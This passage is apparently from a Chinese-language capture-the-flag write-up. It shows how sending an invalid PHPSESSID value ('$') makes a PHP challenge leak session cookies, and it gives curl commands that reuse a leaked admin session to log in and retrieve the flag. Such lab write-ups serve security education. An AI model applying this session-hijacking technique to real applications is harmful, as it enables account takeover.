
> 如果指定了`id`且不为`null`，它将替换当前的会话 ID。`session_id()`需要在此目的之前调用`session_start()`。根据会话处理程序的不同，并非所有字符都允许出现在会话 ID 中。例如，文件会话处理程序仅允许`a-z A-Z 0-9 , (逗号) 和 - (减号)`范围内的字符！

在`session_id`调用过程中，并非所有字符都能存在于`cookie`中。

它只允许`a-z A-Z 0-9 , -`等字符，如果我们使用特殊字符，它是否会报错呢？报什么错？有什么危害？

它能够使得`session_start`方法发生错误。

我们可以尝试一下它的作用：

```bash
curl 'http://18.185.14.202/chall1/index.php?page=login&username=user&password=user' -H 'Cookie: PHPSESSID=$' -v
```

这是什么！

我们居然得到了很多程序运行中设置的`cookie`值，那么其中一个是否是我们需要的呢？

当然有！

```bash
curl 'http://18.185.14.202/chall1/index.php?page=login&username=admin&password=123' -H 'Cookie: PHPSESSID=ugr7im9314nhn283bse6j0gf4r' -v
```

![](upload/attach/202209/962655\_U4V4X9WKR7X5CHV.png)

成功登录上了`admin`（中途刷新了一下`cookie`，所以导致`cookie`不一样）。

之后就是通过这个`cookie`进行`flag`的获取：

```bash
curl 'http://18.185.14.202/chall1/index.php?page=flag' -H 'Cookie: PHPSESSID=ugr7im9314nhn283bse6j0gf4r' -v
```

![](upload/attach/202209/962655\_8HMHHB7VBC7P7FE.png)

那么为什么会产生这种错误呢？主要是因为没有对`PHPSESSID`的值进行校验，使得产生错误，执行了`Session`类的`stop`方法中的`session_write_close()`方法。
